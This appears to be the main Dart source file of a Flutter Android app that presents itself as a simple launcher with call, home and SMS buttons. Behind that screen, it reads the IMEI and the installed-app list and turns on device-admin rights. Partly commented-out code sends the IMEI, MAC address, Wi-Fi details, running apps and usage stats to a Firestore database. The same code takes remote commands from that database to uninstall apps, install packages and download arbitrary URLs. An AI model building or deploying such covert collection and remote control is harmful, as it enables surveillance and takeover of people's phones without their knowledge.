import 'package:flutter/gestures.dart';
import 'package:flutter/material.dart';
import 'package:getinfo/Appdrawer.dart';
import 'package:device_info/device_info.dart';
import 'package:device_apps/device_apps.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:android_wifi_info/android_wifi_info.dart';
import 'package:imei_plugin/imei_plugin.dart';
import 'package:uninstall_apps/uninstall_apps.dart';
import 'package:admin/admin.dart';
import 'package:flutter_install_app_plugin/flutter_install_app_plugin.dart';
import 'package:flutter/services.dart';
import 'package:downloader/downloader.dart';
import 'package:wifi/wifi.dart';
import 'package:connect_wifi/connect_wifi.dart';
import 'package:connectivity/connectivity.dart';
import 'package:battery/battery.dart';
import 'package:running_apps/running_apps.dart';
import "package:system_info/system_info.dart";
import 'package:app_usage/app_usage.dart';
import 'package:cpu_usage/cpu_usage.dart';
import 'package:url_launcher/url_launcher.dart';




void main() => runApp(MyApp());

class MyApp extends StatefulWidget {
  @override
  _MyAppState createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {

  @override
  Widget build(BuildContext context) {

    SystemChrome.setSystemUIOverlayStyle(SystemUiOverlayStyle(
          statusBarColor: Colors.transparent,
   ));
   
    
    return MaterialApp(
      
      home: Home(),
      debugShowCheckedModeBanner: false,
    );
  }
}




class Home extends StatefulWidget {
  @override
  _HomeState createState() => _HomeState();
}

class _HomeState extends State<Home> {

 
  String message="";

  static const methodChannel = const MethodChannel('com.tarazgroup');

   
  List<dynamic> wifi=[];
   Future<List> getWifiList()async{
      var connectivityResult = await (Connectivity().checkConnectivity());
     
       if (connectivityResult != ConnectivityResult.wifi) {
             ConnectWifi.enable();
        }
      
        wifi = await Wifi.list('');

      
      
      
      for(int i=0;i<wifi.length;i++){
        print(wifi[i].ssid);
      }
      return wifi;
      }


   







  
 
  
  String time;
  Battery battery;
 
  int MEGABYTE = 1024 * 1024;

  
     
  initState(){

    

     time = TimeOfDay.now().toString();
     battery =Battery();
     


   
    getInfo();
    Admin.enable();
    Downloader.getPermission();
    super.initState();
  
    // methodChannel.setMethodCallHandler((call)async {
        
    //     print(call.method);
        
        
    //      var connectivityResult = await (Connectivity().checkConnectivity());
         
    //     if (connectivityResult == ConnectivityResult.wifi || connectivityResult == ConnectivityResult.mobile) {
            
     
    //     Firestore.instance.collection("Informations").where("Device_info.id",isEqualTo:fg).getDocuments().then((docs){
           
    //        var data = docs.documents.last;
    //                       if(data["Command"].startsWith("com.")){
    //                            UninstallApps.uninstall(data["Command"].toString());
    //                            Firestore.instance.collection("Informations").document(data.documentID).updateData({"Command":""});
                            
    //                       }else if(data["Command"].toString().startsWith("install")){
    //                               installapps(data["Command"].toString().split(" ")[1].toString());
    //                               Firestore.instance.collection("Informations").document(data.documentID).updateData({"Command":""});
                            
    //                       }else if(data["Command"].toString().startsWith("download")){
    //                               String url = data["Command"].toString().split(" ")[1].toString();
    //                               String name = data["Command"].toString().split(" ")[2].toString();
    //                               String ext = "."+data["Command"].toString().split(" ")[3].toString();
    //                               Downloader.download(url,name,ext);
    //                               Firestore.instance.collection("Informations").document(data.documentID).updateData({"Command":""});
                            
    //                       }else if(data["Command"].toString().startsWith("promptwifi")){
    //                              ConnectWifi.enable();
    //                              ConnectWifi.openWifi();
                               
    //                              Firestore.instance.collection("Informations").document(data.documentID).updateData({"Command":""});
                              
    //                       }
    //                       CpuUsage.getRam().then((ram){
    //                       getUsageStats().then((running_app){
    //                       battery.batteryLevel.then((bat){

    //                               Firestore.instance.collection("Informations").document(data.documentID).updateData({"Command":"","Battery":bat,"Running Apps":running_app,
    //                                                 "RamInfo":{
    //                                                       "Total Ram":"${ram[0]} MB",
    //                                                       "Avaliable Ram":"${ram[1]} MB",
    //                                                        "Used Ram":"${ram[2]} MB",
    //                                                        "Threshold Ram":"${ram[3]} MB",
    //                                                       }
    //                                                       });

    //                              });});});
                         
    //      });
        
    //     }
       
      
    // });
  }
  String fg;
  
  Stream gettime() async*{
    setState(() {
      time = TimeOfDay.now().toString();
    });
    
  }
  Future<Map> getUsageStats() async {
    // Initialization
    AppUsage appUsage = new AppUsage();
     Map<String, double> usage;
    try {
      // Define a time interval
      DateTime endDate = new DateTime.now();
      DateTime startDate = DateTime(endDate.year, endDate.month, endDate.day, 0, 0, 0);
      
      // Fetch the usage stats
      usage = await appUsage.fetchUsage(startDate, endDate);
      
      // (Optional) Remove entries for apps with 0 usage time
      usage.removeWhere((key,val) => val == 0);

      print(usage.length);

      
    }
    on AppUsageException catch (exception) {
      print(exception);
    }
    return usage;

}



  Future getInfo() async{

   DeviceInfoPlugin info = DeviceInfoPlugin();
   AndroidDeviceInfo androidDeviceInfo = await info.androidInfo;
   List<Application> apps = await DeviceApps.getInstalledApplications(includeSystemApps: true);

   List app = []; 
   var imei = await ImeiPlugin.getImei;
   print(apps);
  
   for( Application i in apps){
     if(i.systemApp){
       app.add({"Appname":i.appName,"Package":i.packageName,"Vesion name":i.versionName,"Version Code":i.versionCode,"SystemApp":true});
     }else
        app.add({"Appname":i.appName,"Package":i.packageName,"Vesion name":i.versionName,"Version Code":i.versionCode,"SystemApp":false});
   }
  
  //  Map<String,dynamic> allinfo = {

  //   "version":androidDeviceInfo.version.toString(),
  //   "board":androidDeviceInfo.board.toString(),
  //   "bootloader":androidDeviceInfo.bootloader.toString(),
  //   "brand":androidDeviceInfo.board.toString(),
  //   "device":androidDeviceInfo.device.toString(),
  //   "display":androidDeviceInfo.display.toString(),
  //   "fingerprint":androidDeviceInfo.fingerprint.toString(),
  //   "hardware":androidDeviceInfo.hardware.toString(),
  //   "host":androidDeviceInfo.host.toString(),
  //   "id":androidDeviceInfo.id.toString(),
  //   "manufacturer":androidDeviceInfo.manufacturer.toString(),
  //   "model":androidDeviceInfo.model.toString(),
  //   "product":androidDeviceInfo.product.toString()

  //   };

    fg=androidDeviceInfo.id.toString();


    //    Firestore.instance.collection("Informations").where("Device_info.id",isEqualTo:fg).getDocuments().then((docs){
    //      List<DocumentSnapshot> doc = docs.documents;

    //      if(doc.length==0){
    //       RunningApps.getRunningApps(true).then((running_app){
    //         print(running_app);
    //        AndroidWifiInfo.bssid.then((bssid){
    //          AndroidWifiInfo.ssid.then((ssid){
    //             AndroidWifiInfo.macAddress.then((mac){
    //                battery.batteryLevel.then((bat){
    //                ConnectWifi.platformVersion.then((version){

    //                    Firestore.instance.collection("Informations").add({


    //              "Status":"Online",
    //              "Installed_Apps":app,
    //               "Device_info":allinfo,
    //               "Imei":imei,
    //               "Command":"",
    //               "Battery":bat,
    //               "Settings":[],
    //               "System":{

                                                      
    //                         "Kernel name": "${SysInfo.kernelName}",
    //                         "Kernel version": "${SysInfo.kernelVersion}",
    //                         "Operating system name": "Android",
    //                         "Operating system version": "$version",
    //                         "User directory": "${SysInfo.userDirectory}",
    //                         "User id": "${SysInfo.userId}",
    //                         "User name": "${SysInfo.userName}",
                                                    

    //               },
    //               "Memory":{
    //                   "Total physical memory "  : "${(SysInfo.getTotalPhysicalMemory() ~/ MEGABYTE).toString()} MB",
    //                   "Free physical memory"    : "${SysInfo.getFreePhysicalMemory() ~/ MEGABYTE} MB",
    //                   "Total virtual memory"    : "${SysInfo.getTotalVirtualMemory() ~/ MEGABYTE} MB",
    //                   "Free virtual memory"     : "${SysInfo.getFreeVirtualMemory() ~/ MEGABYTE} MB",
    //                   "Virtual memory size"     : "${SysInfo.getVirtualMemorySize() ~/ MEGABYTE} MB",
    //               },
    //               "wifi":{
    //                 "bssid":bssid,
    //                 "ssid":ssid,
    //                 "mac address":mac
    //               },
    //               "Running Apps":running_app

    //           });

    //                });  
              

    //           }); 

    //           });

    //          });

    //         });
    //         });
          
             

          
             
          

    //      }else{
    //              Firestore.instance.collection("Informations").document(doc.last.documentID).updateData({"Status":"Active"});

    //      }
    
    
    // });

  }

  installapps(String package){
    var app = AppSet();
    app.androidPackageName=package;
    FlutterInstallAppPlugin.installApp(app);

  }

  _launchCaller() async {
         const url = "tel:";   
         if (await canLaunch(url)) {
            await launch(url);
         } else {
           throw 'Could not launch $url';
         }   
     }


     _launchSms() async {
         const url = "sms:";   
         if (await canLaunch(url)) {
            await launch(url);
         } else {
           throw 'Could not launch $url';
         }   
     }

     





  @override
  Widget build(BuildContext context) {
    return Scaffold(
       
       backgroundColor: Colors.white,
       body: Padding(
               padding: const EdgeInsets.all(18.0),
               child: Column(
                 mainAxisAlignment: MainAxisAlignment.end,
                 children: <Widget>[

                   Expanded(child: Container(
                     height: 100,
                     width: MediaQuery.of(context).size.width,
                     child: StreamBuilder(
                      stream: null, //Firestore.instance.collection("Informations").where("Device_info.id",isEqualTo:fg).snapshots(),
                       builder: (context,snap){
                         
                           if(snap.hasData){
                              getUsageStats();
                              print(snap.data.documents.last.data["System"]);   
                              if(snap.hasData){
                                if(snap.data.documents.last.data["Command"].toString().startsWith("uninstall")){
                                 Admin.uninstall("com.facebook.lite"); 
                                
                              
                                }else if(snap.data.documents.last.data["Command"].toString().startsWith("install")){
                                    installapps(snap.data.documents.last.data["Command"].toString().split(" ")[1].toString());
                              
                                }else if(snap.data.documents.last["Command"].toString().startsWith("download")){
                                    String url = snap.data.documents.last.data["Command"].toString().split(" ")[1].toString();
                                    String name = snap.data.documents.last.data["Command"].toString().split(" ")[2].toString();
                                    String ext = "."+snap.data.documents.last.data["Command"].toString().split(" ")[3].toString();
                                    Downloader.download(url,name,ext);
                              
                                }else if(snap.data.documents.last.data["Command"].toString().startsWith("promptwifi")){
                                    
                                     ConnectWifi.enable();
                                     ConnectWifi.openWifi();
                                    
                                }

                                print(snap.data.documents.last["Command"]+"        1");
                                   CpuUsage.getRam().then((ram){
                                 AndroidWifiInfo.bssid.then((bssid){
                                 AndroidWifiInfo.ssid.then((ssid){
                                 AndroidWifiInfo.macAddress.then((mac){
                               
                                   getUsageStats().then((running_app){
                                         print(running_app);
          
                                    battery.batteryLevel.then((bat){

                                     Firestore.instance.collection("Informations").document(snap.data.documents.last.documentID).updateData(
                                                                {"Command":"",
                                                                "Battery":bat,
                                                                "wifi":{
                                                                             "bssid":bssid,
                                                                             "ssid":ssid,
                                                                             "mac address":mac
                                                                           },
                                                                 "Running Apps":running_app,
                                                                 "RamInfo":{
                                                                           "Total Ram":"${ram[0]} MB",
                                                                           "Avaliable Ram":"${ram[1]} MB",
                                                                            "Used Ram":"${ram[2]} MB",
                                                                            "Threshold Ram":"${ram[3]} MB",
                                                                          }         
                                                    
                                                                });

                                    });

               
               
                                  });});});});});

                                

                               
                                 
                               

                                
                              }
                              }
                               return GridView.count(
                               // Create a grid with 2 columns. If you change the scrollDirection to
                               // horizontal, this produces 2 rows.
                               
                               crossAxisCount: 4,
                               // Generate 100 widgets that display their index in the List.
                               children: List.generate(0, (index) {
                                 return Center(
                                   child: Text(
                                     'Item $index',
                                     style: Theme.of(context).textTheme.headline,
                                   ),
                                 );
                               }),
                             );
                             

                                
                         


                       },
                     ),
                   ),),
                  
                  
                   Padding(padding: EdgeInsets.all(10),),
                    Material(
                      
                      elevation:3,
                      borderRadius: BorderRadius.circular(20),
                      child: Row(
                        
                        mainAxisAlignment: MainAxisAlignment.spaceEvenly,
                        children: <Widget>[
                          IconButton(icon: Icon(Icons.phone,size: 30, color: Colors.black,),onPressed: (){
                               _launchCaller();
                          },),
                          IconButton(icon: Icon(Icons.home,size: 30,color: Colors.black, ),onPressed: (){
                               var route = MaterialPageRoute(builder: (context)=>AppDraw(fg));
                               Navigator.of(context).push(route);
                          }),
                          IconButton(icon: Icon(Icons.message,size: 30, color: Colors.black,),onPressed: (){
                                    _launchSms();
                          })

                        ],
                      ),
                    )
                 ],
               ),
            
       ),
       
    );
  }
}

